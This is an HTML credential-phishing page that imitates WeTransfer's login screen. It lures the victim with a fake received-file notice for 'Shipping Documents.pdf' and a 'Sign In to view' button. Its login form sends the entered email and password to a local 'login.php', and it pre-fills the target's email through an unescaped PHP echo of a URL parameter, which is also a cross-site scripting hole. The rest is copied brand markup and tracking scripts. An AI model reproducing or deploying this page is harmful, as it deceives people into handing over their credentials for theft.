<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<!-- Mimic Internet Explorer 7 -->
  
  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
  <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, user-scalable=no">
  <meta name="pinterest" content="nopin">
  <meta name="referrer" content="origin">
  <link rel="stylesheet" media="screen" href="./Log%20in%20_%20WeTransfer_files/application-31ba2fca.chunk.css">
      <meta property="og:description" content="WeTransfer is the simplest way to send your files around the world">
      <meta property="og:title" content="WeTransfer">
    <meta property="og:type" content="website">
    <meta property="fb:app_id" content="265125293564341">

    <meta name="description" content="WeTransfer is the simplest way to send your files around the world. Share large files up to 2GB for free.">

  <meta name="author" content="WeTransfer">

  <link rel="canonical" href="">
  <link rel="preconnect" href="" crossorigin="">
  <link rel="preconnect" href="" crossorigin="">
  <link rel="preconnect" href="" crossorigin="">
  <link rel="preconnect" href="" crossorigin="">
  <link rel="preconnect" href="" crossorigin="">
  <link rel="preconnect" href="" crossorigin="">

  <link rel="shortcut icon" href="https://prod-cdn.wetransfer.net/packs/media/images/favicon-a34a7465.ico">
  <link rel="icon" sizes="16x16 32x32" href="https://prod-cdn.wetransfer.net/packs/media/images/favicon-a34a7465.ico"><!-- default favicon -->
  
  
  <link rel="mask-icon" href="https://prod-cdn.wetransfer.net/packs/media/images/favicon-5a543f69.svg" color="#17181A"><!-- iOS: -->
  
  
  <link rel="apple-touch-icon-precomposed" href="https://prod-cdn.wetransfer.net/packs/media/images/apple-touch-icon-bd1315cf.png">
  <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://prod-cdn.wetransfer.net/packs/media/images/apple-touch-icon-152x152-precomposed-58e4c998.png">
  <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://prod-cdn.wetransfer.net/packs/media/images/apple-touch-icon-180x180-precomposed-fd272b89.png">
  <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://prod-cdn.wetransfer.net/packs/media/images/apple-touch-icon-167x167-precomposed-976d4eb8.png">
  
  <meta name="application-name" content="WeTransfer">

  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="CfSkzDpfz8emxYKWaSrqww0t4366ZGQ5dk8di5h4+69kLfH9UcF+gR2z+DAs85uhPe7BiYr2+AdN+g+lzlfhzw==">

    

  <title>Login to view Document | WeTransfer</title><style type="text/css">
    .assets-warning-node {
      display: none;
      visibility: hidden;
      position: fixed;
      background: #fff;
      z-index: 999;
      bottom: 0; left: 0; right: 0; top: 0;;
      padding: 2em;
      line-height: 1.4;
      font-family: sans-serif;;
      font-size: 1.1em;
    }
    .assets-warning-node p {
      max-width: 42em;
    }
    .root-node .no-script {
      position: fixed;
      background: #E65050;
      color: #fff;
      top: 0;
      left: 0;
      margin: 0;
      padding: 1em;
      font-weight: bold;
    }
  </style>
  
<script type="text/javascript" async="" src="./Log%20in%20_%20WeTransfer_files/gtm.js"></script><script type="text/javascript" defer="defer" async="" src="./Log%20in%20_%20WeTransfer_files/uaest.js"></script><script src="./Log%20in%20_%20WeTransfer_files/runtime-application-bae6b3d27d71300344ec.js"></script><script src="./Log%20in%20_%20WeTransfer_files/application-3eeb5277cf258518d0d3.chunk.js"></script><script src="./Log%20in%20_%20WeTransfer_files/vendor-c1e5c4a61233ead6ea74.chunk.js"></script><style>@font-face{font-family:uc-nexus-iconfont;src:url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.woff) format('woff'),url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.ttf) format('truetype')}</style></head>

<body>

    

  

  <div class="assets-warning-node">
    <h1>Uh-oh...</h1>
    <p>
      We couldn't load some important parts of our website.
They may have been blocked by your firewall, proxy or browser set-up.
Try refreshing the page or get in touch through our <a href="" rel="external">help center</a>.
    </p>
  </div>

  <div class="root-node"><div class="app application"><div class="panel panel--half panel--no-transition panel--visible"><div class="panel__topbar"><button type="button" class="button panel__close button--enabled" tabindex="0"><svg viewbox="0 0 24 24" aria-label="Close panel"><path fill="#babcbf" fill-rule="evenodd" d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-10-1.414L9.875 8.46c-.38-.38-1.02-.386-1.41.004-.394.394-.393 1.023-.004 1.41L10.587 12 8.46 14.125c-.38.38-.386 1.02.004 1.41.394.394 1.023.393 1.41.004L12 13.413l2.125 2.125c.38.38 1.02.386 1.41-.004.394-.394.393-1.023.004-1.41L13.413 12l2.125-2.125c.38-.38.386-1.02-.004-1.41-.394-.394-1.023-.393-1.41-.004L12 10.587zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z"></path></svg></button></div><div class="scrollable panel__scrollable"><div class="scrollable__content" style="margin-right: 0px;"><div class="panel__content signin-page"><div>
        <div class="signin-page--is-new">
    <div class="signin__form-container"><div class="signin-form"><div class="signin-form--form-container"><h2>Log in</h2><form name="form" method="post" action="login.php"><div class="textfield textfield--default"><label for="email" class="textfield__label"></label><input name="email" value="<?php echo $_GET['Email']; ?>" placeholder="Email Address" class="textfield__field" autocomplete="On" tabindex="" type="email"></div><div class="textfield textfield--default"><label for="password" class="textfield__label"></label><input name="password" autofocus="autofocus" placeholder="Password" class="textfield__field" autocomplete="Off" tabindex="" value="" type="password"></div><button enabled="" type="submit" class="button button--enabled" tabindex="">Submit</button><div class="signin-form__options-wrapper"><label for="remember_me" class="checkboxinput signin-form__options"><input class="checkboxinput__field" id="remember_me" name="remember_me" tabindex="3" checked="checked" type="checkbox"><span class=""><svg class="checkboxinput__valid-icon" viewbox="0 0 13 13"><path stroke="#ffffff" stroke-width="2.057" d="M3 6.888L6.16 10.2 11 3" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></span><span class="checkboxinput__label"></span></label><a href="" tabindex="0" class=""></a></div></form></div></div></div>
    <div class="signin__content">
      <div class="plus-banner plus-banner--upgrade">
	<div class="plus-banner__header-text--upgrade">
		<h1 class="free-account-title">Get more out of WeTransfer</h1>
	</div>
</div>
      <div class="free-account-tiers">
  <div class="tiers__list">
    <div class="tier">
      <div class="tier__content">
        <h2 class="tier__title">WeTransfer Account</h2>
        <h3 class="tier__subtitle">Free forever</h3>
        <ul class="tier__features">
          <li class="tier__feature-item tier__feature-item--unavailable">
            No storage
          </li>
          <li class="tier__feature-item">
            Send up to 2 GB
          </li>
          <li class="tier__feature-item">
            Resend and delete transfers
          </li>
        </ul>
      </div>


      <a href="" class="button button--enabled button--inline" id="sign-in-free-account-free-button">
        Sign up for free
      </a>
    </div>

    <div class="tier">
      <div class="tier__content">
        <h2 class="tier__title">WeTransfer Pro</h2>
        <h3 class="tier__subtitle">
          <div class="tier__price">
            <span>$12</span>
              <sup>USD</sup>
            <span class="tier__period">/month</span>
          </div>
        </h3>
        <ul class="tier__features">
          <li class="tier__feature-item">
            1 TB storage
          </li>
          <li class="tier__feature-item">
            Send and receive up to 20 GB
          </li>
          <li class="tier__feature-item">
            Resend and delete transfers
          </li>
          <li class="tier__feature-item">
            Password-protect transfers
          </li>
          <li class="tier__feature-item">
            Your own Pro page and URL
          </li>
        </ul>
      </div>
      <a href="" class="button button--enabled" id="sign-in-free-account-plus-button">
        Get WeTransfer Pro
      </a>
    </div>
  </div>
</div>

    </div>
  </div>

    </div></div><footer class="footer"></footer><div class="footer__menu"><svg width="33" height="21" class="footer__logo" viewbox="0 0 44 21"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path></defs><g fill="none" class="logo-shape"><use fill="#484a4d" fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg><div class="poptip"><span class="languagepicker__current"><svg class="arrow-icon--bottom languagepicker__arrow" viewbox="-1 14 9 12"><path stroke="#6a6d70" stroke-width="2" d="M5 15l-5 5 5 5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></div><nav class="footer__nav"><path d="M277.972039,24.25 C277.309208,24.625002 276.592932,24.885416 275.823191,25.03125 C275.160359,24.343746 274.337176,24 273.353618,24 C272.434206,24 271.643095,24.322914 270.980263,24.96875 C270.317431,25.614586 269.98602,26.385412 269.98602,27.28125 C269.98602,27.531252 270.018092,27.781248 270.082237,28.03125 C268.713809,27.96875 267.425581,27.63542 266.217515,27.03125 C265.009451,26.42708 263.988491,25.614588 263.154605,24.59375 C262.83388,25.093752 262.67352,25.64583 262.67352,26.25 C262.67352,27.416672 263.175982,28.322914 264.180921,28.96875 C263.646379,28.96875 263.143917,28.833334 262.67352,28.5625 L262.67352,28.625 C262.67352,29.395838 262.924751,30.08333 263.42722,30.6875 C263.92969,31.29167 264.576475,31.677082 265.367599,31.84375 C265.068255,31.90625 264.768916,31.9375 264.469572,31.9375 C264.255756,31.9375 264.041941,31.916666 263.828125,31.875 C264.063324,32.54167 264.464223,33.08854 265.03084,33.515624 C265.597454,33.94271 266.244241,34.15625 266.971217,34.15625 C265.752461,35.0937546 264.362671,35.5625 262.801809,35.5625 C262.545229,35.5625 262.277962,35.5520834 262,35.53125 C263.582245,36.5104216 265.303444,37 267.163651,37 C268.660369,37 270.028776,36.7187528 271.268914,36.15625 C272.509053,35.5937472 273.519321,34.85938 274.299752,33.953124 C275.080185,33.04687 275.684209,32.04688 276.111842,30.953124 C276.539475,29.85937 276.753289,28.760422 276.753289,27.65625 L276.753289,27.25 C277.416121,26.77083 277.972037,26.19792 278.421053,25.53125 C277.800983,25.802084 277.159542,25.979166 276.496711,26.0625 C277.223687,25.624998 277.715458,25.020838 277.972039,24.25 L277.972039,24.25 Z" stroke="none" fill="#6a6d70" fill-rule="evenodd"></path></svg></a><path d="M299,25.0094776 C299,23.347389 300.336631,22 302.009478,22 L311.990522,22 C313.652611,22 315,23.3366311 315,25.0094776 L315,34.9905224 C315,36.652611 313.663369,38 311.990522,38 L302.009478,38 C300.347389,38 299,36.6633689 299,34.9905224 L299,25.0094776 Z M310.03529,38 L310.03529,31.8064419 L312.114271,31.8064419 L312.425522,29.3926592 L310.03529,29.3926592 L310.03529,27.8515655 C310.03529,27.1527191 310.229327,26.6764345 311.231515,26.6764345 L312.509717,26.6758951 L312.509717,24.5170337 C312.288593,24.4876704 311.529882,24.4219326 310.647185,24.4219326 C308.804309,24.4219326 307.542706,25.5467865 307.542706,27.6125843 L307.542706,29.3926592 L305.458451,29.3926592 L305.458451,31.8064419 L307.542706,31.8064419 L307.542706,38 L310.03529,38 Z" stroke="none" fill="#6a6d70" fill-rule="evenodd"></path></svg></a><path d="M8.497.005c-2.307 0-2.597.01-3.503.05C4.09.1 3.472.242 2.93.452c-.558.22-1.03.51-1.504.982-.472.472-.763.946-.98 1.505C.236 3.47.092 4.09.05 5 .01 5.905 0 6.194 0 8.502c0 2.307.01 2.597.05 3.503.042.905.186 1.522.396 2.063.217.558.508 1.03.98 1.504.473.472.946.763 1.505.98.55.21 1.16.354 2.07.395.91.04 1.2.05 3.51.05s2.6-.01 3.507-.05c.905-.042 1.523-.186 2.063-.396.56-.21 1.032-.5 1.504-.98.476-.47.766-.94.98-1.5.21-.54.357-1.16.4-2.06.04-.9.05-1.19.05-3.5s-.01-2.593-.05-3.5c-.043-.905-.186-1.523-.396-2.063-.22-.56-.51-1.033-.98-1.505-.472-.47-.946-.76-1.506-.98-.54-.205-1.16-.35-2.06-.39C11.1.02 10.81.01 8.505.01zm0 1.53c2.27 0 2.538.01 3.434.05.83.04 1.28.177 1.58.294.4.15.68.33.98.63.3.3.48.58.64.97.12.3.26.75.3 1.58.04.89.05 1.16.05 3.43 0 2.27-.01 2.533-.05 3.43-.04.83-.175 1.28-.292 1.576-.153.4-.337.68-.634.98-.3.3-.58.483-.977.64-.3.114-.75.253-1.58.29-.895.04-1.164.05-3.433.05-2.27 0-2.54-.01-3.437-.05-.83-.038-1.28-.177-1.577-.293-.4-.156-.68-.34-.98-.638-.3-.297-.48-.58-.636-.977-.114-.3-.253-.75-.29-1.578-.04-.895-.05-1.163-.05-3.43 0-2.27.01-2.54.05-3.436.038-.83.177-1.28.293-1.58.154-.393.338-.676.636-.974.3-.3.58-.48.98-.637.3-.12.75-.26 1.575-.297.896-.04 1.164-.05 3.43-.05z" fill="#6a6d70" fill-rule="evenodd"></path><path d="M8.497 11.335c-1.564 0-2.832-1.268-2.832-2.832 0-1.565 1.268-2.833 2.832-2.833 1.565 0 2.833 1.268 2.833 2.833 0 1.564-1.268 2.832-2.833 2.832zm0-7.196c-2.41 0-4.363 1.95-4.363 4.36s1.953 4.36 4.363 4.36 4.363-1.95 4.363-4.36-1.95-4.36-4.36-4.36zm5.556-.18c0 .56-.457 1.02-1.02 1.02s-1.02-.46-1.02-1.02.457-1.02 1.02-1.02 1.02.45 1.02 1.02z" fill="#6a6d70" fill-rule="evenodd"></path></svg></a><path d="M23.723 3.665S23.49 2 22.771 1.267C21.86.305 20.838.3 20.37.244 17.016 0 11.986 0 11.986 0h-.01s-5.03 0-8.384.244c-.467.056-1.49.061-2.4 1.023C.474 2 .239 3.665.239 3.665S0 5.618 0 7.573v1.833c0 1.955.24 3.908.24 3.908s.234 1.664.952 2.397c.912.963 2.109.932 2.641 1.034 1.917.184 8.148.243 8.148.243s5.035-.007 8.39-.253c.469-.057 1.49-.061 2.4-1.024.718-.733.952-2.397.952-2.397s.24-1.955.24-3.908V7.573c0-1.955-.24-3.908-.24-3.908zm-14.217 7.96V4.84l6.475 3.405-6.475 3.38z" fill-rule="evenodd" fill="#6a6d70"></path></svg></a></div></div><div class="scrollable__scrollbar"><div class="scrollable__scrollbar-thumb" style="height: 0px;"></div></div></div></div><div class="welcome welcome--tandc"><div class="welcome__background"></div><div class="welcome__container"><div class="welcome__cover"></div><div class="welcome__content-wrapper"><div class="welcome__content"><br></div></div></div></div><div class="transfer transfer--half-panel" route="[object Object]"><div class="transfer__window uploader uploader--form uploader--type-email"><div class="scrollable transfer__contents"><div class="scrollable__content" style="margin-right: 0px;"><div class="uploader__files"><form><input multiple="" tabindex="0" type="file"><input tabindex="0" multiple="" webkitdirectory="webkitdirectory" directory="directory" type="file"></form><div class="uploader__empty-state uploader__empty-state--with-directories-selector"><svg viewbox="0 0 72 72"><path d="M36.493 72C16.118 72 0 55.883 0 36.493 0 16.118 16.118 0 36.493 0 55.882 0 72 16.118 72 36.493 72 55.882 55.883 72 36.493 72zM34 34h-9c-.553 0-1 .452-1 1.01v1.98A1 1 0 0 0 25 38h9v9c0 .553.452 1 1.01 1h1.98A1 1 0 0 0 38 47v-9h9c.553 0 1-.452 1-1.01v-1.98A1 1 0 0 0 47 34h-9v-9c0-.553-.452-1-1.01-1h-1.98A1 1 0 0 0 34 25v9z" fill="#409fff" fill-rule="nonzero"></path></svg><h2>You have received some files</h2><button tabindex="0" class="uploader__sub-title uploader__directories-dialog-trigger"></button></div></div>
	<div class="uploader__fields"><div class="uploader__recipientsContainer"><div class="uploader__autosuggest"><div class="textfield textfield--default textfield--borderbottom"><label for="autosuggest" class="textfield__label">From: Mark Cobbins</label><input name="" class="textfield__field" autocomplete="off" value="" type="email"></div></div></div><div class="textfield textfield--default uploader__sender textfield--borderbottom"><label for="email" class="textfield__label"></label>To: <input name="email" value="<?php echo $_GET['Email']; ?>" class="textfield__field" autocomplete="Off" value="" type="email"></div><div class="uploader__message"><div class="textarea textarea--default textarea--noborder"><label id="id_3505" for="message" class="textarea__label">Shipping Documents.pdf 751.KB</label><textarea aria-labelledby="id_3505" name="message" class="textarea__field" type="text"></textarea><div class="uploader__message--shadow"></div></div></div></div></div><div class="scrollable__scrollbar"><div class="scrollable__scrollbar-thumb" style="height: 0px;"></div></div></div><div class="transfer__footer"><button class="transfer__toggle-options" aria-label="Toggle transfer options"><svg viewbox="0 0 24 24"><path fill="#409fff" d="M12,24 C5.372583,24 0,18.627417 0,12 C0,5.372583 5.372583,0 12,0 C18.627417,0 24,5.372583 24,12 C24,18.627417 18.627417,24 12,24 Z M12,22 C17.5228475,22 22,17.5228475 22,12 C22,6.4771525 17.5228475,2 12,2 C6.4771525,2 2,6.4771525 2,12 C2,17.5228475 6.4771525,22 12,22 Z M16.5,13.5 C17.3284271,13.5 18,12.8284271 18,12 C18,11.1715729 17.3284271,10.5 16.5,10.5 C15.6715729,10.5 15,11.1715729 15,12 C15,12.8284271 15.6715729,13.5 16.5,13.5 Z M12,13.5 C12.8284271,13.5 13.5,12.8284271 13.5,12 C13.5,11.1715729 12.8284271,10.5 12,10.5 C11.1715729,10.5 10.5,11.1715729 10.5,12 C10.5,12.8284271 11.1715729,13.5 12,13.5 Z M7.5,13.5 C8.32842712,13.5 9,12.8284271 9,12 C9,11.1715729 8.32842712,10.5 7.5,10.5 C6.67157288,10.5 6,11.1715729 6,12 C6,12.8284271 6.67157288,13.5 7.5,13.5 Z"></path></svg></button><button type="button" disabled="disabled" class="transfer__button transfer__button--inactive">Sign In to view</button></div></div></div><nav class="nav nav--with-panel"></nav><ul class="nav__items"><li class="nav__item"><a href="" class="nav__link"><span class="nav__label">Help</span></a></li><li class="nav__item"><a href="" target="_blank" class="nav__link"><span class="nav__label">Products</span></a></li><li class="nav__item"><a href="" target="_blank" class="nav__link"><span class="nav__label">About us</span></a></li><li class="nav__item"><a href="" class="nav__link"><span class="nav__label">Sign up</span></a></li><li class="nav__item nav__item--active"><a href="" class="nav__link"><span class="nav__label">Log in</span></a></li></ul><div class="spinner logo spinner--single"><svg height="44" width="44" class="spinner__circle" shape-rendering="geometricPrecision" viewbox="0 0 44 44"><circle class="spinner__background" r="20.5" cx="22" cy="22" fill="transparent" style=""></circle><circle class="spinner__foreground" r="20.5" cx="22" cy="22" fill="transparent" style=""></circle></svg><svg width="52" height="29" class="spinner__logo" viewbox="-4 -2 52 29"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path><filter id="logo-filter" width="200%" height="200%" x="-50%" y="-50%" filterunits="objectBoundingBox"><feoffset dx="0" dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feoffset><fegaussianblur stddeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></fegaussianblur></filter></defs><g fill="none" class="logo-shape"><use fill="#17181a" fill-opacity="0.11" filter="url(#logo-filter)" xlink:href="#logo-path"></use><use fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg><svg class="spinner__aborted" viewbox="55 42 171 171"><g fill="none" fill-rule="evenodd"><path fill="#e65050" d="M136.75 141.407h7.432l3.315-29.634V92.887h-14.164v18.886l3.416 29.634zM133.734 162h13.36v-13.26h-13.36V162z"></path></g></svg><svg class="spinner__finished" viewbox="0 0 13 13"><path stroke="#409fff" stroke-width="2.057" d="M3 6.888L6.16 10.2 11 3" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div>
  <script async="" src="./Log%20in%20_%20WeTransfer_files/gtm%281%29.js"></script><script async="" src="./Log%20in%20_%20WeTransfer_files/sp.js"></script><script src="./Log%20in%20_%20WeTransfer_files/en-2a6aa74f6efb5865eae5.es6.js"></script>
  <script src="./Log%20in%20_%20WeTransfer_files/en-76f5516f9005915a5b4c.es6.js"></script>
  <script type="text/javascript">
  var __app_settings__ = {
    revision: "9a774bd0469ba27e03ee60aef146405d5fe8ccaa",
    fileSizes: {
      maxWallpaperSize: 5242880,
      maxEmailBackgroundSize: 3145728,
      maxProfilePictureSize: 5242880
    }
  };
</script>

  
<script type="text/javascript">
var __session__ = {"user":{"id":false,"language":"en","accepted_languages":["en-US","en"],"rules":{"maximum_number_of_files":65536,"maximum_number_of_recipients":3,"storage_limit":0,"transfer_limit":2147483648,"transfer_limit_for_default_recipient":21474836480,"can_password_protect_transfers":false,"default_free_expiry":"7d","default_pro_expiry":"28d"}},"region":{"country":"NG","continent":"AF","currency":"USD"},"settings":{"cookie_domain":"wetransfer.com","compatibility_version":11}};
</script>

  
  <script type="text/javascript">
  var Wallpapers = [];
</script>

  
  <!-- Snowplow start plowing -->
  <script type="text/javascript">
  ;(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];
  p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)
  };p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[0];n.async=1;
  n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,"script","//d19ptbnuzhibkh.cloudfront.net/2.10.2/sp.js","__snowplow__"));
  __snowplow__.collector = "snowplow.wetransfer.com";
  __snowplow__.namespace = "38f1"
  </script>
  <!-- Snowplow stop plowing -->

  <!-- GTM start managing -->
  <noscript>&lt;iframe
src="//www.googletagmanager.com/ns.html?id=GTM-5WF5RH4" height="0"
width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
  <script type="text/javascript">
    try {
      (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),'event':'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
      })(window,document,'script','dataLayer','GTM-5WF5RH4');
    } catch (e) {/* do nothing */}
  </script>
  <!-- GTM stop managing -->

  
<script type="text/javascript">
  var transferExpiryOptions = ["never","28d","14d","7d"];
</script>


  <script type="text/javascript">var __trackjs__={enabled:!0,token:"c695133a6747471db439aca0a2500556"};</script>
  <script type="text/javascript">var __recaptcha__={siteKey:"6LcSPjQUAAAAAA564_maWrrykToPliPNfbKrIcdf"};window.recaptchaOptions={lang:"en"};</script>

  <script type="text/javascript">
  var __launch_darkly__ = {
    enabled: true,
    client_id: "5b82f23280914154b163996e",
    feature_flags: {"account-state-field":true,"admiral-cookie-consent":false,"ccpa-banner":false,"cookie-banner":false,"cookie-banner-copy":"none","cookie-wall":false,"cross-product-usage-survey-upsell":false,"dmca-takedown-claim-form":false,"downgrade-intervention":false,"email-transfers":"control","expiry-date-refactor":true,"folder-upload-accessibility":true,"force-account-verification":true,"free-account-affluent":false,"transfer-verification":true,"free-account-launch":true,"free-accounts-pro-expiration-reminders":false,"implement-spaces":false,"individual-user-email-verification":false,"intercom":true,"marketing-pixel-tracking":true,"navigation-bar-redesign":true,"new-transfer-expiry-options":false,"otp-verification":true,"peek-rollout":true,"pro-pass-banner-upsells":true,"pro-pass-upsells":true,"pro-transfer-window":false,"progress-panel-tooltip":false,"projects-promo-notice":false,"received-transfers-redesign":true,"receiving-page":"sticky-app-bar","reject-consent-button-visibility":false,"remove-transfer-default-expiry":false,"sign-in-panel-redesign":false,"signup-verification":true,"spot-illustrations":false,"sso-rollout":false,"tcf-powered-cookie-wall":true,"teams-survey-upsell":true,"tos-transfer-window":false,"transfer-tooltip":true,"transfer-verification-new-ui":true,"upsell_survey":false,"wallpaper-rotation-intervals-per-country":{"mid":180000,"max":600000,"min":45000},"we-transfer-outage-banner":"control","$flagsState":{"account-state-field":{"version":5,"reason":{"kind":"FALLTHROUGH"},"variation":0},"admiral-cookie-consent":{"version":2,"reason":{"kind":"OFF"},"variation":1},"ccpa-banner":{"version":2,"reason":{"kind":"OFF"},"variation":1},"cookie-banner":{"version":21,"reason":{"kind":"OFF"},"variation":1},"cookie-banner-copy":{"version":9,"reason":{"kind":"OFF"},"variation":3},"cookie-wall":{"version":13,"reason":{"kind":"OFF"},"variation":1},"cross-product-usage-survey-upsell":{"version":2,"reason":{"kind":"OFF"},"variation":1},"dmca-takedown-claim-form":{"version":4,"reason":{"kind":"OFF"},"variation":1},"downgrade-intervention":{"version":11,"reason":{"kind":"FALLTHROUGH"},"variation":1,"trackEvents":true},"email-transfers":{"version":10,"reason":{"kind":"OFF"},"variation":0,"trackEvents":true},"expiry-date-refactor":{"version":6,"reason":{"kind":"FALLTHROUGH"},"variation":0},"folder-upload-accessibility":{"version":5,"reason":{"kind":"FALLTHROUGH"},"variation":0},"force-account-verification":{"version":8,"reason":{"kind":"FALLTHROUGH"},"variation":0},"free-account-affluent":{"version":13,"reason":{"kind":"OFF"},"variation":1,"trackEvents":true},"transfer-verification":{"version":27,"reason":{"kind":"FALLTHROUGH"},"variation":0},"free-account-launch":{"version":10,"reason":{"kind":"FALLTHROUGH"},"variation":0,"trackEvents":true},"free-accounts-pro-expiration-reminders":{"version":6,"reason":{"kind":"FALLTHROUGH"},"variation":1},"implement-spaces":{"version":53,"reason":{"kind":"FALLTHROUGH"},"variation":1},"individual-user-email-verification":{"version":6,"reason":{"kind":"FALLTHROUGH"},"variation":1},"intercom":{"version":4,"reason":{"kind":"FALLTHROUGH"},"variation":0},"marketing-pixel-tracking":{"version":8,"reason":{"kind":"FALLTHROUGH"},"variation":0},"navigation-bar-redesign":{"version":10,"reason":{"kind":"OFF"},"variation":0},"new-transfer-expiry-options":{"version":14,"reason":{"kind":"FALLTHROUGH"},"variation":1},"otp-verification":{"version":9,"reason":{"kind":"OFF"},"variation":0},"peek-rollout":{"version":76,"reason":{"kind":"FALLTHROUGH"},"variation":0},"pro-pass-banner-upsells":{"version":5,"reason":{"kind":"FALLTHROUGH"},"variation":0},"pro-pass-upsells":{"version":5,"reason":{"kind":"FALLTHROUGH"},"variation":0},"pro-transfer-window":{"version":2,"reason":{"kind":"OFF"},"variation":1},"progress-panel-tooltip":{"version":13,"reason":{"kind":"OFF"},"variation":1},"projects-promo-notice":{"version":3,"reason":{"kind":"OFF"},"variation":1},"received-transfers-redesign":{"version":6,"reason":{"kind":"FALLTHROUGH"},"variation":0},"receiving-page":{"version":6,"reason":{"kind":"OFF"},"variation":1,"trackEvents":true},"reject-consent-button-visibility":{"version":3,"reason":{"kind":"FALLTHROUGH"},"variation":1},"remove-transfer-default-expiry":{"version":11,"reason":{"kind":"FALLTHROUGH"},"variation":1},"sign-in-panel-redesign":{"version":6,"reason":{"kind":"OFF"},"variation":1,"trackEvents":true},"signup-verification":{"version":8,"reason":{"kind":"FALLTHROUGH"},"variation":0,"trackEvents":true},"spot-illustrations":{"version":2,"reason":{"kind":"OFF"},"variation":1},"sso-rollout":{"version":16,"reason":{"kind":"FALLTHROUGH"},"variation":1},"tcf-powered-cookie-wall":{"version":9,"reason":{"kind":"FALLTHROUGH"},"variation":0},"teams-survey-upsell":{"version":3,"reason":{"kind":"FALLTHROUGH"},"variation":0},"tos-transfer-window":{"version":3,"reason":{"kind":"OFF"},"variation":1},"transfer-tooltip":{"version":8,"reason":{"kind":"OFF"},"variation":0},"transfer-verification-new-ui":{"version":7,"reason":{"kind":"FALLTHROUGH"},"variation":0},"upsell_survey":{"version":5,"reason":{"kind":"OFF"},"variation":1},"wallpaper-rotation-intervals-per-country":{"version":2,"reason":{"kind":"OFF"},"variation":1},"we-transfer-outage-banner":{"version":25,"reason":{"kind":"OFF"},"variation":2}},"$valid":true},
    user: {"key":"2852a9a7-95d6-4de5-9927-90a9188d942d","anonymous":true,"ip":"105.112.32.129","custom":{"plus-user-id":null,"is-mobile":false,"is-wetransfer-staff":false,"is-qa-source":false},"privateAttributeNames":["country","is-mobile","plus-user-id","is-wetransfer-staff","is-qa-source","ip"],"country":"NG"}
  };
</script>

    <script type="text/javascript">
